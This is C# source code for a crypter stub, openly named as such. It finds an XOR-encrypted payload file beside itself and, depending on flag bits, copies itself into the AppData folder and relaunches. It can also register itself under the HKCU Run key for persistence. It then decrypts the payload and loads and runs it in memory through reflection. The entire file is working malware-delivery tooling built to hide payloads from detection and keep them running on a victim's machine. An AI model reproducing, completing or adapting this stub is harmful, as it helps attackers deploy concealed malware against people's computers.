using System;
using System.IO;
using System.Reflection;
using Microsoft.Win32;

namespace CrypterStub
{
    class Program
    {
        static byte xorKey = 0xAA;

        static void Main()
        {
            try
            {
                string stubPath = System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName;
                string appDataPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
                string targetFolder = Path.Combine(appDataPath, "MyApp");

                string[] allowedExtensions = { ".enc", ".dll", ".lol", ".resx" };
                string baseDir = AppDomain.CurrentDomain.BaseDirectory;
                string stubFileName = Path.GetFileName(stubPath);
                string payloadPath = null;

                foreach (var file in Directory.GetFiles(baseDir))
                {
                    string fileName = Path.GetFileName(file);
                    string ext = Path.GetExtension(fileName).ToLowerInvariant();
                    if (!fileName.Equals(stubFileName, StringComparison.OrdinalIgnoreCase) &&
                        Array.Exists(allowedExtensions, e => e.Equals(ext, StringComparison.OrdinalIgnoreCase)))
                    {
                        payloadPath = file;
                        break;
                    }
                }

                if (payloadPath == null)
                {
                    Console.WriteLine("No payload file found with allowed extensions (.enc, .dll, .lol, .resx).");
                    return;
                }


                byte[] encryptedBytes = File.ReadAllBytes(payloadPath);
                if (encryptedBytes.Length < 2)
                {
                    Console.WriteLine("Corrupt payload.");
                    return;
                }

                byte flags = encryptedBytes[0];
                bool shouldAddToStartup = (flags & 0b01) != 0;
                bool shouldInstall = (flags & 0b10) != 0;

                byte[] actualPayload = new byte[encryptedBytes.Length - 1];
                Array.Copy(encryptedBytes, 1, actualPayload, 0, actualPayload.Length);

                if (shouldInstall)
                {
                    if (!Directory.Exists(targetFolder))
                        Directory.CreateDirectory(targetFolder);

                    string targetExe = Path.Combine(targetFolder, "stub.exe");
                    string targetPayload = Path.Combine(targetFolder, "payload.enc");

                    if (!stubPath.Equals(targetExe, StringComparison.OrdinalIgnoreCase))
                    {
                        File.Copy(stubPath, targetExe, true);
                        File.Copy(payloadPath, targetPayload, true);
                        System.Diagnostics.Process.Start(targetExe);
                        return;
                    }
                }

                if (shouldAddToStartup)
                {
                    string exePath = System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName;
                    using (RegistryKey key = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run", true))
                    {
                        key.SetValue("MyStub", exePath);
                    }
                }

                for (int i = 0; i < actualPayload.Length; i++)
                    actualPayload[i] ^= (byte)(xorKey + (i % 7));

                Assembly asm = Assembly.Load(actualPayload);
                MethodInfo entry = asm.EntryPoint;
                object instance = entry.IsStatic ? null : asm.CreateInstance(entry.Name);
                object[] parameters = entry.GetParameters().Length == 0 ? null : new object[] { new string[0] };

                entry.Invoke(instance, parameters);
            }
            catch (Exception ex)
            {
                Console.WriteLine("Error:");
                Console.WriteLine(ex);
            }
        }
    }
}
